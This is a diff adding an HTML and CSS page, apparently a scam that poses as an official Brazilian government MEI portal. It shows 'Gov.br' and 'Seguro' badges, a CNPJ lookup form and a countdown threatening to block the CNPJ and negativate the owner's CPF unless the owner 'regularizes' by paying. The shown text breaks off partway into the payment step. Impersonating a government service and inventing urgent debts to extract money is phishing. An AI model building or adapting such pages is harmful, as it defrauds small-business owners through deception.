@@ -1,1 +1,1907 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de Pendências MEI - Portal Oficial Brasileiro</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-color: #1e40af;
+            --primary-hover: #1d4ed8;
+            --primary-light: #dbeafe;
+            --secondary-color: #64748b;
+            --success-color: #059669;
+            --success-light: #d1fae5;
+            --warning-color: #d97706;
+            --warning-light: #fef3c7;
+            --error-color: #dc2626;
+            --error-light: #fee2e2;
+            
+            --gray-50: #f8fafc;
+            --gray-100: #f1f5f9;
+            --gray-200: #e2e8f0;
+            --gray-300: #cbd5e1;
+            --gray-400: #94a3b8;
+            --gray-500: #64748b;
+            --gray-600: #475569;
+            --gray-700: #334155;
+            --gray-800: #1e293b;
+            --gray-900: #0f172a;
+            --white: #ffffff;
+            
+            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
+            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
+            --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 10px 10px -5px rgb(0 0 0 / 0.04);
+            
+            --border-radius: 8px;
+            --border-radius-lg: 12px;
+            --border-radius-xl: 16px;
+            
+            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-fast: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
+        }
 
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, var(--gray-50) 0%, var(--white) 100%);
+            color: var(--gray-800);
+            line-height: 1.6;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .header {
+            background: var(--white);
+            border-bottom: 1px solid var(--gray-200);
+            box-shadow: var(--shadow-sm);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
+            border-radius: var(--border-radius);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--white);
+            font-size: 18px;
+            box-shadow: var(--shadow-md);
+            flex-shrink: 0;
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--gray-900);
+            line-height: 1.1;
+        }
+
+        .logo-subtitle {
+            font-size: 11px;
+            font-weight: 500;
+            color: var(--gray-500);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .security-indicators {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        @media (min-width: 640px) {
+            .security-indicators {
+                gap: 12px;
+            }
+        }
+
+        .security-badge {
+            display: none;
+            align-items: center;
+            gap: 6px;
+            background: var(--success-light);
+            color: var(--success-color);
+            padding: 6px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            border: 1px solid var(--success-color);
+        }
+
+        @media (min-width: 640px) {
+            .security-badge {
+                display: flex;
+            }
+        }
+
+        .gov-badge {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            background: var(--primary-light);
+            color: var(--primary-color);
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 9px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            flex-shrink: 0;
+        }
+
+        .main-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 16px 16px 24px;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 16px;
+        }
+
+        @media (min-width: 640px) {
+            .main-container {
+                padding: 20px 20px 24px;
+                gap: 20px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .main-container {
+                grid-template-columns: 1fr 380px;
+                gap: 32px;
+                padding: 24px 20px;
+            }
+        }
+
+        .progress-section {
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            padding: 16px;
+            box-shadow: var(--shadow-sm);
+            margin-bottom: 16px;
+        }
+
+        @media (min-width: 640px) {
+            .progress-section {
+                padding: 20px;
+                margin-bottom: 20px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .progress-section {
+                padding: 24px;
+                margin-bottom: 24px;
+            }
+        }
+
+        .progress-header {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        @media (min-width: 640px) {
+            .progress-header {
+                margin-bottom: 20px;
+            }
+        }
+
+        .progress-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--gray-900);
+            margin-bottom: 4px;
+        }
+
+        @media (min-width: 640px) {
+            .progress-title {
+                font-size: 16px;
+            }
+        }
+
+        .progress-subtitle {
+            font-size: 12px;
+            color: var(--gray-600);
+        }
+
+        @media (min-width: 640px) {
+            .progress-subtitle {
+                font-size: 13px;
+            }
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 18px;
+            left: 16px;
+            right: 16px;
+            height: 2px;
+            background: var(--gray-200);
+            z-index: 1;
+        }
+
+        .progress-line-active {
+            position: absolute;
+            top: 18px;
+            left: 16px;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary-color), var(--primary-hover));
+            z-index: 2;
+            transition: width 0.5s ease;
+            width: 0%;
+            border-radius: 1px;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 3;
+            flex: 1;
+        }
+
+        .step-circle {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: var(--white);
+            border: 2px solid var(--gray-300);
+            color: var(--gray-500);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 13px;
+            transition: var(--transition);
+            margin-bottom: 6px;
+        }
+
+        @media (min-width: 640px) {
+            .step-circle {
+                width: 40px;
+                height: 40px;
+                font-size: 14px;
+                margin-bottom: 8px;
+            }
+        }
+
+        .step.active .step-circle {
+            background: var(--primary-color);
+            border-color: var(--primary-color);
+            color: var(--white);
+            box-shadow: 0 0 0 4px var(--primary-light);
+            transform: scale(1.05);
+        }
+
+        .step.completed .step-circle {
+            background: var(--success-color);
+            border-color: var(--success-color);
+            color: var(--white);
+            transform: scale(1.05);
+        }
+
+        .step-label {
+            font-size: 11px;
+            font-weight: 500;
+            color: var(--gray-600);
+            text-align: center;
+            max-width: 70px;
+        }
+
+        @media (min-width: 640px) {
+            .step-label {
+                font-size: 12px;
+                max-width: 80px;
+            }
+        }
+
+        .step.active .step-label {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        .step.completed .step-label {
+            color: var(--success-color);
+        }
+
+        .form-container {
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            box-shadow: var(--shadow-sm);
+            overflow: hidden;
+        }
+
+        .form-header {
+            background: linear-gradient(135deg, var(--gray-50) 0%, var(--white) 100%);
+            border-bottom: 1px solid var(--gray-200);
+            padding: 16px;
+        }
+
+        @media (min-width: 640px) {
+            .form-header {
+                padding: 20px 24px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .form-header {
+                padding: 24px 32px;
+            }
+        }
+
+        .form-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--gray-900);
+            margin-bottom: 6px;
+        }
+
+        @media (min-width: 640px) {
+            .form-title {
+                font-size: 20px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .form-title {
+                font-size: 24px;
+            }
+        }
+
+        .form-subtitle {
+            font-size: 13px;
+            color: var(--gray-600);
+            line-height: 1.4;
+        }
+
+        @media (min-width: 640px) {
+            .form-subtitle {
+                font-size: 14px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .form-subtitle {
+                font-size: 15px;
+                line-height: 1.5;
+            }
+        }
+
+        .form-content {
+            padding: 16px;
+        }
+
+        @media (min-width: 640px) {
+            .form-content {
+                padding: 20px 24px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .form-content {
+                padding: 32px;
+            }
+        }
+
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
+            animation: fadeInUp 0.3s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        @media (min-width: 640px) {
+            .form-group {
+                margin-bottom: 20px;
+            }
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--gray-800);
+            margin-bottom: 6px;
+        }
+
+        @media (min-width: 640px) {
+            .form-label {
+                font-size: 14px;
+                margin-bottom: 8px;
+            }
+        }
+
+        .form-label.required::after {
+            content: '*';
+            color: var(--error-color);
+            margin-left: 4px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid var(--gray-300);
+            border-radius: var(--border-radius);
+            font-size: 15px;
+            color: var(--gray-900);
+            background: var(--white);
+            transition: var(--transition-fast);
+            min-height: 44px;
+        }
+
+        @media (min-width: 640px) {
+            .form-input {
+                padding: 12px 16px;
+            }
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px var(--primary-light);
+        }
+
+        .form-input.error {
+            border-color: var(--error-color);
+            background: var(--error-light);
+        }
+
+        .form-input.success {
+            border-color: var(--success-color);
+            background: var(--success-light);
+        }
+
+        .error-message {
+            display: none;
+            font-size: 11px;
+            color: var(--error-color);
+            margin-top: 4px;
+        }
+
+        @media (min-width: 640px) {
+            .error-message {
+                font-size: 12px;
+                margin-top: 6px;
+            }
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .info-section {
+            background: var(--gray-50);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            padding: 14px;
+            margin: 16px 0;
+        }
+
+        @media (min-width: 640px) {
+            .info-section {
+                padding: 16px;
+                margin: 20px 0;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .info-section {
+                padding: 20px;
+                margin: 24px 0;
+            }
+        }
+
+        .info-section-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        @media (min-width: 640px) {
+            .info-section-header {
+                gap: 10px;
+                margin-bottom: 16px;
+            }
+        }
+
+        .info-section-icon {
+            font-size: 16px;
+            color: var(--primary-color);
+        }
+
+        @media (min-width: 640px) {
+            .info-section-icon {
+                font-size: 18px;
+            }
+        }
+
+        .info-section-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--gray-900);
+        }
+
+        @media (min-width: 640px) {
+            .info-section-title {
+                font-size: 14px;
+            }
+        }
+
+        .info-section-content {
+            font-size: 12px;
+            color: var(--gray-700);
+        }
+
+        @media (min-width: 640px) {
+            .info-section-content {
+                font-size: 13px;
+            }
+        }
+
+        .cnpj-info-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 8px;
+            padding: 0;
+            background: transparent;
+            border-radius: 0;
+            border: none;
+        }
+
+        @media (min-width: 640px) {
+            .cnpj-info-grid {
+                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                gap: 16px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .cnpj-info-grid {
+                gap: 20px;
+            }
+        }
+
+        .cnpj-info-item {
+            padding: 8px 0;
+            border-bottom: 1px solid var(--gray-200);
+            display: grid;
+            grid-template-columns: 100px 1fr;
+            gap: 8px;
+        }
+
+        @media (min-width: 640px) {
+            .cnpj-info-item {
+                padding: 12px 0;
+                border-bottom: 1px dashed var(--gray-200);
+                display: block;
+            }
+        }
+
+        .cnpj-info-item:last-child {
+            border-bottom: none;
+        }
+
+        .cnpj-info-label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--gray-700);
+            text-transform: none;
+            letter-spacing: 0;
+            margin-bottom: 0;
+        }
+
+        @media (min-width: 640px) {
+            .cnpj-info-label {
+                font-size: 12px;
+                color: var(--gray-500);
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+                margin-bottom: 4px;
+            }
+        }
+
+        .cnpj-info-value {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--gray-900);
+            word-wrap: break-word;
+        }
+
+        @media (min-width: 640px) {
+            .cnpj-info-value {
+                font-size: 14px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .cnpj-info-value {
+                font-size: 15px;
+            }
+        }
+
+        .payment-alert-box {
+            margin-top: 16px;
+            padding: 14px;
+            background-color: var(--warning-light);
+            border: 2px solid var(--warning-color);
+            border-radius: var(--border-radius-lg);
+            box-shadow: var(--shadow-md);
+        }
+
+        @media (min-width: 640px) {
+            .payment-alert-box {
+                margin-top: 20px;
+                padding: 16px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .payment-alert-box {
+                margin-top: 20px;
+                padding: 20px;
+            }
+        }
+
+        .payment-alert-content {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .payment-alert-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        @media (min-width: 640px) {
+            .payment-alert-header {
+                gap: 10px;
+                margin-bottom: 10px;
+            }
+        }
+
+        .payment-alert-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--warning-color);
+        }
+
+        @media (min-width: 640px) {
+            .payment-alert-title {
+                font-size: 14px;
+            }
+        }
+
+        .payment-alert-subtitle {
+            font-size: 12px;
+            color: var(--gray-700);
+            line-height: 1.4;
+        }
+
+        @media (min-width: 640px) {
+            .payment-alert-subtitle {
+                font-size: 13px;
+            }
+        }
+
+        .timer-display {
+            font-weight: 700;
+            color: var(--error-color);
+            font-size: 13px;
+        }
+
+        .fee-notice-section {
+            background: var(--primary-light);
+            border: 1px solid var(--primary-color);
+            border-radius: var(--border-radius-lg);
+            padding: 16px;
+            margin-top: 16px;
+        }
+
+        @media (min-width: 640px) {
+            .fee-notice-section {
+                padding: 20px;
+                margin-top: 20px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .fee-notice-section {
+                padding: 24px;
+                margin-top: 24px;
+            }
+        }
+
+        .fee-notice-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        @media (min-width: 640px) {
+            .fee-notice-header {
+                gap: 12px;
+                margin-bottom: 16px;
+            }
+        }
+
+        .fee-notice-icon {
+            width: 24px;
+            height: 24px;
+            color: var(--primary-color);
+            font-size: 20px;
+        }
+
+        .fee-notice-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin: 0;
+        }
+
+        @media (min-width: 640px) {
+            .fee-notice-title {
+                font-size: 18px;
+            }
+        }
+
+        .fee-notice-content {
+            color: var(--gray-700);
+            line-height: 1.6;
+        }
+
+        .fee-notice-text {
+            font-size: 13px;
+            margin-bottom: 12px;
+        }
+
+        @media (min-width: 640px) {
+            .fee-notice-text {
+                font-size: 14px;
+                margin-bottom: 16px;
+            }
+        }
+
+        .fee-highlight-box {
+            background: var(--white);
+            border: 1px solid var(--primary-color);
+            border-radius: var(--border-radius);
+            padding: 16px;
+            margin: 12px 0;
+            text-align: center;
+        }
+
+        @media (min-width: 640px) {
+            .fee-highlight-box {
+                margin: 16px 0;
+            }
+        }
+
+        .fee-amount {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--primary-color);
+            margin-bottom: 4px;
+        }
+
+        @media (min-width: 640px) {
+            .fee-amount {
+                font-size: 28px;
+            }
+        }
+
+        .fee-description {
+            font-size: 12px;
+            color: var(--gray-600);
+            font-weight: 500;
+        }
+
+        @media (min-width: 640px) {
+            .fee-description {
+                font-size: 14px;
+            }
+        }
+
+        .fee-benefits-list {
+            list-style: none;
+            padding: 0;
+            margin: 12px 0 0 0;
+        }
+
+        @media (min-width: 640px) {
+            .fee-benefits-list {
+                margin: 16px 0 0 0;
+            }
+        }
+
+        .fee-benefits-list li {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 12px;
+            color: var(--gray-700);
+        }
+
+        @media (min-width: 640px) {
+            .fee-benefits-list li {
+                font-size: 14px;
+            }
+        }
+
+        .fee-benefits-list li::before {
+            content: '✓';
+            color: var(--success-color);
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .loading-indicator {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            margin-top: 6px;
+            color: var(--primary-color);
+            font-size: 12px;
+        }
+
+        @media (min-width: 640px) {
+            .loading-indicator {
+                margin-top: 8px;
+                font-size: 13px;
+            }
+        }
+
+        .loading-indicator.show {
+            display: flex;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .spinner {
+            width: 14px;
+            height: 14px;
+            border: 2px solid var(--gray-300);
+            border-top: 2px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 16px;
+        }
+
+        @media (min-width: 640px) {
+            .button-group {
+                flex-direction: row;
+                gap: 12px;
+                margin-top: 24px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .button-group {
+                margin-top: 32px;
+            }
+        }
+
+        .btn {
+            padding: 14px 20px;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            min-height: 48px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        @media (min-width: 640px) {
+            .btn {
+                font-size: 15px;
+                padding: 12px 24px;
+                width: auto;
+                min-width: 140px;
+            }
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
+            color: var(--white);
+            box-shadow: var(--shadow-md);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: var(--gray-100);
+            color: var(--gray-700);
+            border: 1px solid var(--gray-300);
+        }
+
+        .btn-secondary:hover {
+            background: var(--gray-200);
+        }
+
+        .btn-loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        @media (min-width: 640px) {
+            .checkbox-group {
+                gap: 12px;
+                margin-bottom: 16px;
+            }
+        }
+
+        .checkbox-input {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+            cursor: pointer;
+            accent-color: var(--primary-color);
+            flex-shrink: 0;
+        }
+
+        @media (min-width: 640px) {
+            .checkbox-input {
+                width: 20px;
+                height: 20px;
+            }
+        }
+
+        .checkbox-label {
+            font-size: 12px;
+            color: var(--gray-700);
+            line-height: 1.5;
+            cursor: pointer;
+        }
+
+        @media (min-width: 640px) {
+            .checkbox-label {
+                font-size: 14px;
+            }
+        }
+
+        .checkbox-label strong {
+            color: var(--gray-900);
+            font-weight: 600;
+        }
+
+        .declaration-section {
+            background: var(--gray-50);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            padding: 16px;
+            margin: 16px 0;
+        }
+
+        @media (min-width: 640px) {
+            .declaration-section {
+                padding: 20px;
+                margin: 20px 0;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .declaration-section {
+                padding: 24px;
+                margin: 24px 0;
+            }
+        }
+
+        .declaration-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--gray-900);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        @media (min-width: 640px) {
+            .declaration-title {
+                font-size: 16px;
+                margin-bottom: 16px;
+            }
+        }
+
+        .declaration-text {
+            font-size: 12px;
+            color: var(--gray-700);
+            line-height: 1.5;
+            margin-bottom: 12px;
+        }
+
+        @media (min-width: 640px) {
+            .declaration-text {
+                font-size: 14px;
+                line-height: 1.6;
+                margin-bottom: 16px;
+            }
+        }
+
+        .sidebar {
+            display: none;
+        }
+
+        @media (min-width: 1024px) {
+            .sidebar {
+                display: flex;
+                flex-direction: column;
+                gap: 16px;
+            }
+        }
+
+        .summary-card {
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            padding: 16px;
+            box-shadow: var(--shadow-sm);
+            position: sticky;
+            top: 70px;
+        }
+
+        @media (min-width: 1024px) {
+            .summary-card {
+                padding: 20px;
+                top: 80px;
+            }
+        }
+
+        .summary-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--gray-900);
+            margin-bottom: 12px;
+        }
+
+        @media (min-width: 1024px) {
+            .summary-title {
+                font-size: 16px;
+                margin-bottom: 16px;
+            }
+        }
+
+        .price-display {
+            background: linear-gradient(135deg, var(--primary-light) 0%, rgba(30, 64, 175, 0.05) 100%);
+            border-radius: var(--border-radius);
+            padding: 14px;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        @media (min-width: 1024px) {
+            .price-display {
+                padding: 16px;
+                margin-bottom: 16px;
+            }
+        }
+
+        .price-label {
+            font-size: 11px;
+            color: var(--gray-600);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        @media (min-width: 1024px) {
+            .price-label {
+                font-size: 12px;
+            }
+        }
+
+        .price-value {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--primary-color);
+        }
+
+        @media (min-width: 1024px) {
+            .price-value {
+                font-size: 28px;
+            }
+        }
+
+        .trust-section {
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            padding: 16px;
+            box-shadow: var(--shadow-sm);
+        }
+
+        @media (min-width: 1024px) {
+            .trust-section {
+                padding: 20px;
+            }
+        }
+
+        .trust-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--gray-900);
+            margin-bottom: 12px;
+        }
+
+        @media (min-width: 1024px) {
+            .trust-title {
+                font-size: 16px;
+                margin-bottom: 16px;
+            }
+        }
+
+        .trust-item {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+            font-size: 12px;
+            color: var(--gray-700);
+        }
+
+        @media (min-width: 1024px) {
+            .trust-item {
+                gap: 12px;
+                margin-bottom: 12px;
+                font-size: 13px;
+            }
+        }
+
+        .trust-icon {
+            width: 18px;
+            height: 18px;
+            background: var(--success-light);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--success-color);
+            font-size: 11px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        @media (min-width: 1024px) {
+            .trust-icon {
+                width: 20px;
+                height: 20px;
+                font-size: 12px;
+                margin-top: 2px;
+            }
+        }
+
+        .trust-text {
+            line-height: 1.4;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(15, 23, 42, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .loading-content {
+            background: var(--white);
+            padding: 24px;
+            border-radius: var(--border-radius-lg);
+            text-align: center;
+            box-shadow: var(--shadow-xl);
+        }
+
+        @media (min-width: 640px) {
+            .loading-content {
+                padding: 32px;
+            }
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid var(--gray-200);
+            border-top: 3px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        .loading-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--gray-900);
+        }
+
+        @media (min-width: 640px) {
+            .loading-text {
+                font-size: 16px;
+            }
+        }
+
+        .success-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--success-color);
+            color: var(--white);
+            padding: 16px 20px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow-lg);
+            display: none;
+            z-index: 999;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(100px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .status-pending {
+            background: var(--warning-light);
+            color: var(--warning-color);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 11px;
+        }
+
+        @media (min-width: 640px) {
+            .status-pending {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-section">
+                <div class="logo-icon">
+                    <i class="fas fa-building"></i>
+                </div>
+                <div class="logo-text">
+                    <span class="logo-title">Portal MEI</span>
+                    <span class="logo-subtitle">Online</span>
+                </div>
+            </div>
+            <div class="security-indicators">
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Seguro</span>
+                </div>
+                <div class="gov-badge">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Gov.br</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <main>
+            <!-- Seção de Progresso -->
+            <div class="progress-section">
+                <div class="progress-header">
+                    <h2 class="progress-title">Consulta de Pendências do MEI</h2>
+                    <p class="progress-subtitle">Processo rápido, seguro e 100% online.</p>
+                </div>
+                <div class="progress-steps">
+                    <div class="progress-line"></div>
+                    <div class="progress-line-active" id="progressLineActive"></div>
+                    
+                    <div class="step active" data-step="1">
+                        <div class="step-circle">1</div>
+                        <span class="step-label">Validação</span>
+                    </div>
+                    <div class="step" data-step="2">
+                        <div class="step-circle">2</div>
+                        <span class="step-label">Confirmação</span>
+                    </div>
+                    <div class="step" data-step="3">
+                        <div class="step-circle">3</div>
+                        <span class="step-label">Finalização</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Container do Formulário -->
+            <div class="form-container">
+                <!-- Etapa 1: Dados do CNPJ -->
+                <div class="step-content active" id="step1">
+                    <div class="form-header">
+                        <h1 class="form-title">Consultar CNPJ</h1>
+                        <p class="form-subtitle">Informe o CNPJ para realizar a consulta de pendências.</p>
+                    </div>
+                    
+                    <div class="form-content">
+                        <form id="cnpjForm">
+                            <div class="form-group">
+                                <label class="form-label required" for="cnpj">CNPJ</label>
+                                <div style="position: relative;">
+                                    <input type="text" id="cnpj" name="cnpj" class="form-input" maxlength="18" placeholder="00.000.000/0000-00" inputmode="numeric">
+                                </div>
+                                <div class="error-message" id="cnpjError">Digite um CNPJ válido</div>
+                                <div class="loading-indicator" id="cnpjLoadingIndicator">
+                                    <div class="spinner"></div>
+                                    <span>Buscando dados do CNPJ...</span>
+                                </div>
+                            </div>
+
+                            <!-- Seção de Informações do CNPJ -->
+                            <div class="info-section" id="cnpjInfoDisplay" style="display: none;">
+                                <div class="info-section-header">
+                                    <i class="fas fa-building info-section-icon"></i>
+                                    <h3 class="info-section-title">Dados da Empresa</h3>
+                                </div>
+                                <div class="info-section-content">
+                                    <div class="cnpj-info-grid" id="cnpjInfoGrid">
+                                        <!-- Dados serão preenchidos dinamicamente -->
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Mensagem de Aguardando Pagamento (Alerta de Urgência) -->
+                            <div class="payment-alert-box" id="waitingPayment" style="display: none;">
+                                <div class="payment-alert-content">
+                                    <div class="payment-alert-header">
+                                        <div class="spinner"></div>
+                                        <h4 class="payment-alert-title">Pendências Ativas</h4>
+                                    </div>
+                                    <p class="payment-alert-subtitle">
+                                        A não regularização em <span class="timer-display" id="countdownTimer">03:35</span> acarretará no bloqueio do CNPJ e negativação do CPF do titular.
+                                    </p>
+                                </div>
+                            </div>
+
+                            <div class="button-group">
+                                <button type="button" id="btn-prosseguir" class="btn btn-primary">
+                                    <i class="fas fa-arrow-right"></i>
+                                    Consultar Pendências
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- Etapa 2: Pagamento -->
+                <div class="step-content" id="step2">
+                    <div class="form-header">
+                        <h1 class="form-title">Regularize Agora</h1>
+                        <p class="form-subtitle">Revise seus dados e finalize o processo de Regularização do MEI</p>
+                    </div>
+                    
+                    <div class="form-content">
+                        <!-- Seção de Informações do CNPJ (Resumo) -->
+                        <div class="info-section">
+                            <div class="info-section-header">
+                                <i class="fas fa-building info-section-icon"></i>
+                                <h3 class="info-section-title">Dados da Empresa</h3>
+                            </div>
+                            <div class="info-section-content">
+                                <div class="cnpj-info-grid" id="paymentCnpjInfoGrid">
